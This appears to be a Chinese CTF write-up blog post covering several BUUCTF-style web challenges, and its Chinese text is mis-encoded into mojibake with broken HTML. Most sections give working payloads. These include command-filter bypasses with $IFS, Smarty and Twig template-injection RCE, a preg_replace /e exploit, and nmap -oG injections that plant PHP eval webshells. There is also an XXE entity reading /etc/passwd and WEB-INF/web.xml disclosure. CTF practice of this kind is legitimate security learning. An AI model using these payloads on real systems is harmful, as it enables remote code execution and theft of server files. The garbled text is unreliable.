[thinkphp 5-rceç‰ˆæœ¬æ¼æ´å¤ç°(è¶…è¯¦ç»†ç‰ˆ)_thinkphp æ¼æ´æ‰«æ-CSDNåšå®¢](https://blog.csdn.net/weixin_44862511/article/details/132132998)

æ‰“cveè¿›è¡Œrce

# [WUSTCTF2020]æœ´å®æ— å

å…ˆæ‰«ç›®å½•æœ‰robots.txtæŸ¥çœ‹å‘ç°å‡çš„flag

æŠ“åŒ…å‘ç°å“åº”å¤´ä¸­éšè—è¿™ä¸€ä¸ªé¡µé¢

/fl4g.php

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(__file__);</span><br><span class="line"></span><br><span class="line"><span class="comment">//level 1</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>) &lt; <span class="number">2020</span> &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span> + <span class="number">1</span>) &gt; <span class="number">2021</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;æˆ‘ä¸ç»æ„é—´çœ‹äº†çœ‹ä½ ï¼Œçœ‹æˆ‘çš„åŠ¨åŠ›æ·¡äº†ï¼Œä¸æ˜¯æƒ³çœ‹æ—¶é—´ï¼Œåªæ˜¯æƒ³ä¸ç»æ„é—´è®©ä½ çŸ¥é“æˆ‘æ›¾ç»æ¯”ä½ å¥½.&lt;/br&gt;&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;ç”¨é’±è§£å†³ä¸äº†ç©ºè™šäººçš„æœ¬è´¨é—®é¢˜&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;è¿™ä¸ç®—é—¯å…³&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//level 2</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;md5&#x27;</span>]))&#123;</span><br><span class="line">   <span class="variable">$md5</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;md5&#x27;</span>];</span><br><span class="line">   <span class="keyword">if</span> (<span class="variable">$md5</span> == <span class="title function_ invoke__">md5</span>(<span class="variable">$md5</span>))</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&quot;æƒ³è¦åœ¨è¿™ä¸ªCTFeræ‹¿åˆ°flagä¹ˆï¼Œæ„è¯†æµæº¢å‡ºï¼Œå‰å¾€ä¸œéƒŠæ‘ï¼Œæ‰¾åˆ°ä¸€å®šçš„çº¿ç´¢ï¼ŒæŠŠæ¨ç†è®²å‡ºå»ï¼Œè‡ªç„¶æœ‰é“ï¼Œæ‰å­¦å¯çªƒ.&lt;/br&gt;&quot;</span>;</span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">       <span class="keyword">die</span>(<span class="string">&quot;æˆ‘ä»çƒ§çƒ¤æ‘Šçœ‹æˆ‘çš„çœ¼ç¥é‡Œï¼Œçœ‹ä»–æ‰“äº†ä¸ªç”µè¯ï¼ŒæŠŠä»–ä¸€å®šå®‰æ’åˆ°ä¸æ˜¯é—¯å…³çš„äºº&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;è¿™ä¸ç®—é—¯å…³&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//get flag</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;get_flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$get_flag</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;get_flag&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">strstr</span>(<span class="variable">$get_flag</span>,<span class="string">&quot; &quot;</span>))&#123;</span><br><span class="line">        <span class="variable">$get_flag</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;cat&quot;</span>, <span class="string">&quot;wctf2020&quot;</span>, <span class="variable">$get_flag</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;æƒ³è¦åˆ°è¿™é‡Œï¼Œæˆ‘å¾—å®Œå…¨ç ´é˜²ï¼Œæœ‰é’±äººçš„å¿ƒç†å¤šå¤šå°‘å°‘å°±æ˜¯è¿™æ ·çš„ç©ºè™šæ— èŠï¼Œå¹¶ä¸”è‡ªç§.&lt;/br&gt;&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$get_flag</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;é©¬ä¸Šæ»šå‡ºè€ƒåœº&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;è¿™ä¸ç®—é—¯å…³&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&#123;% asset_img image-<span class="number">20250707021034112</span>.png image-<span class="number">20250707021034112</span> %&#125;</span><br></pre></td></tr></table></figure>

ç¬¬ä¸€å±‚ç§‘å­¦è®¡æ•°æ³•ç»•è¿‡ï¼Œç¬¬äºŒå±‚md5è‹¥æ¯”è¾ƒ

ä½¿ç”¨$IFS$9æ¥ç»•è¿‡å¯¹ç©ºæ ¼çš„è¿‡æ»¤

?num=11e3&md5=0e215962017&get_flag=tac$IFS$9fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag

# [BJDCTF2020]Mark loves cat

dirsearchæ‰«ç›®å½•å‘ç°.gitå¯èƒ½å­˜åœ¨æºç æ³„éœ²ä¸Šç½‘

ä½†æ˜¯ä½¿ç”¨githackæ— æ³•æ‹‰å–ä¸‹æ¥æºç ï¼Œå¯èƒ½æ˜¯é¢˜ç›®ç¯å¢ƒé—®é¢˜

ä¸Šç½‘æŸ¥æ‰¾æºç 

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="comment">// åŒ…å«å¤–éƒ¨æ–‡ä»¶ &#x27;flag.php&#x27;ï¼Œå¯èƒ½åŒ…å«å˜é‡ $flag include &#x27;flag.php&#x27;; // åˆå§‹åŒ–ä¸‰ä¸ªå˜é‡ $yds = &quot;dog&quot;;     // $yds è¢«è®¾ç½®ä¸º &quot;dog&quot; $is = &quot;cat&quot;;      // $is è¢«è®¾ç½®ä¸º &quot;cat&quot; $handsome = &#x27;yds&#x27;; // $handsome è¢«è®¾ç½®ä¸ºå­—ç¬¦ä¸² &#x27;yds&#x27; // éå† $_POST æ•°ç»„ï¼Œå°†æ¯ä¸ªé”®å€¼å¯¹èµ‹å€¼ç»™åŠ¨æ€ç”Ÿæˆçš„å˜é‡ foreach($_POST as $x =&gt; $y)&#123;    $$x = $y; // ä¾‹å¦‚ï¼Œå¦‚æœ $_POST åŒ…å« &#x27;foo&#x27; =&gt; &#x27;bar&#x27;ï¼Œåˆ™ç”Ÿæˆ $foo = &#x27;bar&#x27; &#125; // éå† $_GET æ•°ç»„ï¼Œå°†æ¯ä¸ªé”®å€¼å¯¹èµ‹å€¼ç»™åŠ¨æ€ç”Ÿæˆçš„å˜é‡ foreach($_GET as $x =&gt; $y)&#123;    $$x = $$y; // ä¾‹å¦‚ï¼Œå¦‚æœ $_GET åŒ…å« &#x27;foo&#x27; =&gt; &#x27;bar&#x27;ï¼Œåˆ™ç”Ÿæˆ $foo = $bar çš„å€¼ &#125; // å†æ¬¡éå† $_GET æ•°ç»„ï¼Œæ£€æŸ¥ç‰¹å®šæ¡ä»¶ foreach($_GET as $x =&gt; $y)&#123;    // å¦‚æœ $_GET[&#x27;flag&#x27;] çš„å€¼ç­‰äºå½“å‰é”®åä¸”é”®åä¸ä¸º &#x27;flag&#x27;    if($_GET[&#x27;flag&#x27;] === $x &amp;&amp; $x !== &#x27;flag&#x27;)&#123;        // è¾“å‡º $handsome çš„å€¼å¹¶ç»ˆæ­¢è„šæœ¬æ‰§è¡Œ        exit($handsome);    &#125; &#125; // æ£€æŸ¥æ˜¯å¦å­˜åœ¨ $_GET[&#x27;flag&#x27;] æˆ– $_POST[&#x27;flag&#x27;] if(!isset($_GET[&#x27;flag&#x27;]) &amp;&amp; !isset($_POST[&#x27;flag&#x27;]))&#123;    // å¦‚æœè¿™ä¸¤ä¸ªå‚æ•°éƒ½æ²¡æœ‰è¢«è®¾ç½®ï¼Œè¾“å‡º $yds çš„å€¼å¹¶ç»ˆæ­¢è„šæœ¬æ‰§è¡Œ    exit($yds); &#125; // æ£€æŸ¥ $_POST[&#x27;flag&#x27;] æˆ– $_GET[&#x27;flag&#x27;] æ˜¯å¦ç­‰äºå­—ç¬¦ä¸² &#x27;flag&#x27; if($_POST[&#x27;flag&#x27;] === &#x27;flag&#x27; || $_GET[&#x27;flag&#x27;] === &#x27;flag&#x27;)&#123;    // å¦‚æœå…¶ä¸­ä¸€ä¸ªç­‰äº &#x27;flag&#x27;ï¼Œè¾“å‡º $is çš„å€¼å¹¶ç»ˆæ­¢è„šæœ¬æ‰§è¡Œ    exit($is); &#125; // æœ€åè¾“å‡ºå˜é‡ $flag çš„å€¼ echo &quot;the flag is: &quot;.$flag; ?&gt;</span></span><br></pre></td></tr></table></figure>

æŸ¥çœ‹æºç è€ƒå¯Ÿå˜é‡è¦†ç›–

å°±æ˜¯é€šè¿‡ä¸ºå˜é‡èµ‹å€¼å¦å¤–çš„ä¸€ä¸ªå˜é‡çš„å˜é‡åæ¥è¿›è¡Œç»•è¿‡

?handsome=flag&flag=x&x=flag



[CISCN2019 åä¸œå—èµ›åŒº]Web11

æ ¹æ®å†…å®¹æ¨æµ‹ssrf

<img src="/2025/07/10/buu%E5%88%B7%E9%A2%98/image-20250707103155907.png" class="" title="image-20250707103155907">

æ›´æ”¹ä¸ºæœ¬åœ°ipï¼Œå‘ç°å³ä¸Šè§’IPåœ°å€æ”¹å˜ï¼Œåº”è¯¥æ˜¯æ³¨å…¥ç‚¹fuzzè¯†åˆ«æ˜¯ä»€ä¹ˆæ³¨å…¥æ¼æ´

åº”è¯¥æ˜¯sstiæ¨¡æ¿æ³¨å…¥

dirsearchæ‰«æå‘ç°æ˜¯smarty æ¨¡æ¿

{system('cat /flag')}

ä¸Šç½‘æŸ¥å¯»å¯ä»¥ç›´æ¥ä½¿ç”¨systemè¿›è¡Œrce

<img src="/2025/07/10/buu%E5%88%B7%E9%A2%98/image-20250707153124322.png" class="" title="image-20250707153124322">

# [BJDCTF2020]The mystery of ip

æŸ¥çœ‹ipæµ‹è¯•æ›´æ”¹æœ¬åœ°ipå‘ç°ä¼šç›´æ¥å›æ˜¾ï¼Œæµ‹è¯•sstiå‘ç°

<img src="/2025/07/10/buu%E5%88%B7%E9%A2%98/image-20250707153942714.png" class="" title="image-20250707153942714">

æµ‹è¯•æ¨¡æ¿ç±»å‹

<img src="/2025/07/10/buu%E5%88%B7%E9%A2%98/image-20250707154133792.png" class="" title="image-20250707154133792">

å‘ç°æ˜¯smarty

<img src="/2025/07/10/buu%E5%88%B7%E9%A2%98/image-20250707154144518.png" class="" title="image-20250707154144518">

ç›´æ¥ä½¿ç”¨systemè¿›è¡Œæµ‹è¯•

èƒ½å¤Ÿç›´æ¥æ‰§è¡ŒæŒ‡ä»¤

# [BJDCTF2020]ZJCTFï¼Œä¸è¿‡å¦‚æ­¤

?text=php://input&file=php://filter/convert.base64-encode/resource=next.php

ä½¿ç”¨inputå’Œfilteråè®®é˜…è¯»next.phpæ–‡ä»¶å†…å®¹

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>] = <span class="variable">$id</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">complex</span>(<span class="params"><span class="variable">$re</span>, <span class="variable">$str</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(</span><br><span class="line">        <span class="string">&#x27;/(&#x27;</span> . <span class="variable">$re</span> . <span class="string">&#x27;)/ei&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,</span><br><span class="line">        <span class="variable">$str</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$re</span> =&gt; <span class="variable">$str</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">complex</span>(<span class="variable">$re</span>, <span class="variable">$str</span>). <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    @<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

æŸ¥çœ‹ä»£ç å‘ç°éœ€è¦ä½¿ç”¨getflagè¿™ä¸ªå‡½æ•°æ¥è¿›è¡Œrce

åœ¨php5ä¸­preg_replace /eå­˜åœ¨æ¼æ´å¯ä»¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œ

é€šè¿‡\Sè®©å…¶åŒ¹é…ç©ºå­—ç¬¦æ¥ç¡®å®šåé¢å¯ä»¥è°ƒç”¨getflagå‡½æ•°æ¥è¿›è¡Œrce

\S*={${getFlag()}}&cmd=system('cat /flag');

# [BUUCTF 2018]Online Tool

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;host&#x27;</span>])) &#123;</span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="variable">$host</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line">  <span class="variable">$host</span> = <span class="title function_ invoke__">escapeshellarg</span>(<span class="variable">$host</span>);</span><br><span class="line">  <span class="variable">$host</span> = <span class="title function_ invoke__">escapeshellcmd</span>(<span class="variable">$host</span>);</span><br><span class="line">  <span class="variable">$sandbox</span> = <span class="title function_ invoke__">md5</span>(<span class="string">&quot;glzjin&quot;</span>. <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;you are in sandbox &#x27;</span>.<span class="variable">$sandbox</span>;</span><br><span class="line">  @<span class="title function_ invoke__">mkdir</span>(<span class="variable">$sandbox</span>);</span><br><span class="line">  <span class="title function_ invoke__">chdir</span>(<span class="variable">$sandbox</span>);</span><br><span class="line">  <span class="keyword">echo</span> <span class="title function_ invoke__">system</span>(<span class="string">&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;</span>.<span class="variable">$host</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">å…¶ä½¿ç”¨äº†</span><br><span class="line"></span><br><span class="line">  <span class="variable">$host</span> = <span class="title function_ invoke__">escapeshellarg</span>(<span class="variable">$host</span>);</span><br><span class="line">  <span class="variable">$host</span> = <span class="title function_ invoke__">escapeshellcmd</span>(<span class="variable">$host</span>);</span><br></pre></td></tr></table></figure>

æ¥é¿å…rceæ¼æ´ä½†æ˜¯å½“ä¸¤è€…ä¸€å—ä½¿ç”¨æ—¶åè€Œä¼šè§¦å‘æ¼æ´

<img src="/2025/07/10/buu%E5%88%B7%E9%A2%98/image-20250707170845298.png" class="" title="image-20250707170845298">

å…¶ä¼šå¯¹ç‰¹æ®Šå­—ç¬¦è¿›è¡Œè½¬ä¹‰

' <?php @eval($_POST["mayi"]);?><p> -oG mayi.php â€˜</p>
<p>åˆ©ç”¨nmapçš„å‚æ•°ç”Ÿæˆå¸¦æœ‰ä¸€å¥è¯æœ¨é©¬çš„æ–‡ä»¶å³å¯</p>
<h1 id="NCTF2019-Fake-XML-cookbook"><a href="#NCTF2019-Fake-XML-cookbook" class="headerlink" title="[NCTF2019]Fake XML cookbook"></a>[NCTF2019]Fake XML cookbook</h1><p>é¢˜ç›®æç¤ºxxeæ³¨å…¥</p>
<table>
<thead>
<tr>
<th>function doLogin(){</th>
</tr>
</thead>
<tbody><tr>
<td>var username &#x3D; $(â€œ#usernameâ€).val();</td>
</tr>
<tr>
<td>var password &#x3D; $(â€œ#passwordâ€).val();</td>
</tr>
<tr>
<td>if(username &#x3D;&#x3D; â€œâ€ || password &#x3D;&#x3D; â€œâ€){</td>
</tr>
<tr>
<td>alert(â€œPlease enter the username and password!â€);</td>
</tr>
<tr>
<td>return;</td>
</tr>
<tr>
<td>}</td>
</tr>
<tr>
<td></td>
</tr>
<tr>
<td>var data &#x3D; â€œ<user><username>â€œ + username + â€œ</username><password>â€œ + password + â€œ</password></user>â€œ;</td>
</tr>
<tr>
<td>$.ajax({</td>
</tr>
<tr>
<td>type: â€œPOSTâ€,</td>
</tr>
<tr>
<td>url: â€œdoLogin.phpâ€,ä¸Š</td>
</tr>
<tr>
<td>contentType: â€œapplication&#x2F;xml;charset&#x3D;utf-8â€,</td>
</tr>
<tr>
<td>data: data,</td>
</tr>
<tr>
<td>dataType: â€œxmlâ€,</td>
</tr>
<tr>
<td>anysc: false,</td>
</tr>
<tr>
<td>success: function (result) {</td>
</tr>
<tr>
<td>var code &#x3D; result.getElementsByTagName(â€œcodeâ€)[0].childNodes[0].nodeValue;</td>
</tr>
<tr>
<td>var msg &#x3D; result.getElementsByTagName(â€œmsgâ€)[0].childNodes[0].nodeValue;</td>
</tr>
<tr>
<td>if(code &#x3D;&#x3D; â€œ0â€){</td>
</tr>
<tr>
<td>$(â€œ.msgâ€).text(msg + â€œ login fail!â€);</td>
</tr>
<tr>
<td>}else if(code &#x3D;&#x3D; â€œ1â€){</td>
</tr>
<tr>
<td>$(â€œ.msgâ€).text(msg + â€œ login success!â€);</td>
</tr>
<tr>
<td>}else{</td>
</tr>
<tr>
<td>$(â€œ.msgâ€).text(â€œerror:â€ + msg);</td>
</tr>
<tr>
<td>}</td>
</tr>
<tr>
<td>},</td>
</tr>
<tr>
<td>error: function (XMLHttpRequest,textStatus,errorThrown) {</td>
</tr>
<tr>
<td>$(â€œ.msgâ€).text(errorThrown + â€˜:â€™ + textStatus);</td>
</tr>
<tr>
<td>}</td>
</tr>
<tr>
<td>});</td>
</tr>
<tr>
<td>}</td>
</tr>
</tbody></table>
<p>æŸ¥çœ‹æºä»£ç é€šè¿‡postå°†å‚æ•°ä¼ å…¥é“doLogin.phpä¹‹ä¸­è¿›è¡Œåˆ¤æ–­</p>
<p>1111ä½¿ç”¨ä¸‹è¿°xmlè¿›è¡Œæµ‹è¯•<!DOCTYPE foo [
<!ELEMENT foo ANY ><br><!ENTITY xxe SYSTEM "file:///etc/passwd" >]&gt;<br><foo>&xxe;</foo></p>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" ><p>]&gt;<br><foo>&xxe;</foo></p>
<img src="/2025/07/10/buu%E5%88%B7%E9%A2%98/image-20250707181749696.png" class="" title="image-20250707181749696">

<p>å¯ç›´æ¥å‡ºæ¥æ•°æ®å†…å®¹ï¼Œæ³¨æ„xmlçš„æ ¼å¼åœ¨å¼•ç”¨æ—¶&amp;adminåéœ€è¦åŠ å…¥ï¼›</p>
<p>åœ¨xxeæ³¨å…¥ä¸­éœ€è¦æ³¨æ„xmlæ–‡ä»¶çš„æ ¼å¼</p>
<h1 id="BJDCTF2020-Cookie-is-so-stable"><a href="#BJDCTF2020-Cookie-is-so-stable" class="headerlink" title="[BJDCTF2020]Cookie is so stable"></a>[BJDCTF2020]Cookie is so stable</h1><img src="/2025/07/10/buu%E5%88%B7%E9%A2%98/image-20250707182448806.png" class="" title="image-20250707182448806">

<p>å­˜åœ¨æ³¨å…¥ç‚¹ï¼Œè¾“å…¥ä»€ä¹ˆå›æ˜¾ä»€ä¹ˆ</p>
<p>æµ‹è¯•ä¸ºsstiæ³¨å…¥</p>
<p>é€šè¿‡è¿›ä¸€æ­¥æµ‹è¯•å‘ç°ä¸ºjwitæ¨¡æ¿æ³¨å…¥</p>
<p>ä½¿ç”¨å¸¸ç”¨payloadè¿›è¡Œæ³¨å…¥ï¼ŒæˆåŠŸæ‰§è¡Œ</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;cat /flag&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>



<h1 id="VNCTF2023-è±¡æ£‹ç‹å­ã€"><a href="#VNCTF2023-è±¡æ£‹ç‹å­ã€" class="headerlink" title="[VNCTF2023]è±¡æ£‹ç‹å­ã€"></a>[VNCTF2023]è±¡æ£‹ç‹å­ã€</h1><p>åœ¨æºç é‡Œå‘ç°äº†jsæ··æ·†çš„ä»£ç </p>
<p>è¯¥å†…å®¹èƒ½ç›´æ¥æ‰§è¡Œæ•…ä¸¢åˆ°æ§åˆ¶å°å»çœ‹çœ‹æˆåŠŸè·å–flag</p>
<h1 id="ç½‘é¼æ¯-2020-æœ±é›€ç»„-Nmap"><a href="#ç½‘é¼æ¯-2020-æœ±é›€ç»„-Nmap" class="headerlink" title="[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]Nmap"></a>[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]Nmap</h1><p>è¯¥é¢˜ç›®ä¸å‰é¢çš„</p>
<p>[BUUCTF 2018]Online Toolå¾ˆåƒåˆ©ç”¨nmapçš„-ogå‚æ•°å°†æœ¨é©¬å†™å…¥æ–‡ä»¶å†…ï¼Œä¸è¿‡è¯¥é¢˜ç›®é˜Ÿå¯¹phpæœ‰ä¸ªè¿‡æ»¤ä½¿ç”¨ä»¥ä¸‹payloadå³å¯</p>
<p>127.0.0.1 | â€˜ <?=@eval($_POST["cmd"]);?> -oG shell.phtml â€˜</p>
<img src="/2025/07/10/buu%E5%88%B7%E9%A2%98/image-20250709114156059.png" class="" title="image-20250709114156059">

<h1 id="RoarCTF-2019-Easy-Java"><a href="#RoarCTF-2019-Easy-Java" class="headerlink" title="[RoarCTF 2019]Easy Java"></a>[RoarCTF 2019]Easy Java</h1><p>å‰ç½®çŸ¥è¯†ï¼š</p>
<p>WEB-INFæ˜¯javaçš„WEBåº”ç”¨çš„å®‰å…¨ç›®å½•ã€‚</p>
<p>1.WEB-INF&#x2F;web.xml</p>
<p>webåº”ç”¨ç¨‹åºé…ç½®æ–‡ä»¶ï¼Œæè¿°äº†servletå’Œå…¶ä»–çš„åº”ç”¨ç»„ä»¶é…ç½®åŠå‘½åè§„åˆ™ã€‚</p>
<p>2.WEB-INF&#x2F;classes</p>
<p>åŒ…å«äº†ç«™ç‚¹æ‰€æœ‰ç”¨çš„classæ–‡ä»¶ï¼ŒåŒ…æ‹¬servlet classå’Œéservlet class</p>
<p>3.WEB-INF&#x2F;lib</p>
<p>å­˜æ”¾webåº”ç”¨éœ€è¦çš„JARæ–‡ä»¶</p>
<p>4.WEB-INF&#x2F;src</p>
<p>æºç ç›®å½•ï¼ŒæŒ‰ç…§åŒ…åç»“æ„æ”¾ç½®å„ä¸ªjavaæ–‡ä»¶</p>
<p>5.WEB-INF&#x2F;database.properties</p>
<p>æ•°æ®åº“é…ç½®æ–‡ä»¶</p>
<p>6.WEB-INF&#x2F;tags</p>
<p>å­˜æ”¾äº†è‡ªå®šä¹‰æ ‡ç­¾æ–‡ä»¶</p>
<p>7.WEB-INF&#x2F;jsp</p>
<p>jsp 1.2 ä¸€ä¸‹ç‰ˆæœ¬çš„æ–‡ä»¶å­˜æ”¾ä½ç½®ã€‚</p>
<p>8.WEB-INF&#x2F;jsp2</p>
<p>å­˜æ”¾jsp2.0ä»¥ä¸‹ç‰ˆæœ¬çš„æ–‡ä»¶ã€‚</p>
<p>9.META-INF</p>
<p>ç›¸å½“äºä¸€ä¸ªä¿¡æ¯åŒ…ã€‚</p>
<p>Tomcatçš„WEB-INFç›®å½•ï¼Œæ¯ä¸ªj2eeçš„webåº”ç”¨éƒ¨ç½²æ–‡ä»¶é»˜è®¤åŒ…å«è¿™ä¸ªç›®å½•ã€‚</p>
<p>Nginxåœ¨æ˜ å°„é™æ€æ–‡ä»¶æ—¶ï¼ŒæŠŠWEB-INFç›®å½•æ˜ å°„è¿›å»ï¼Œè€Œåˆæ²¡æœ‰åšNginxçš„ç›¸å…³å®‰å…¨é…ç½®ï¼ˆæˆ–Nginxè‡ªèº«ä¸€äº›ç¼ºé™·å½±å“ï¼‰ã€‚ä»è€Œå¯¼è‡´é€šè¿‡Nginxè®¿é—®åˆ°Tomcatçš„WEB-INFç›®å½•ï¼ˆè¯·æ³¨æ„è¿™é‡Œï¼Œæ˜¯é€šè¿‡Nginxï¼Œè€Œä¸æ˜¯Tomcatè®¿é—®åˆ°çš„ï¼Œå› ä¸ºä¸Šé¢å·²ç»è¯´åˆ°ï¼ŒTomcatæ˜¯ç¦æ­¢è®¿é—®è¿™ä¸ªç›®å½•çš„ã€‚ï¼‰ã€‚</p>
<p>ç›´æ¥åœ¨åŸŸååé¢åŠ ä¸ŠWEB-INF&#x2F;web.xmlå°±å¯ä»¥äº†</p>
<p>å½“æ”»å‡»è€…é€šè¿‡ä¼ å…¥æ¶æ„çš„<code>name</code>å‚æ•°å€¼ä¸º<code>WEB-INF/web.xml</code>æ—¶å¯ä»¥è¯»å–Webåº”ç”¨çš„é…ç½®ä¿¡æ¯</p>
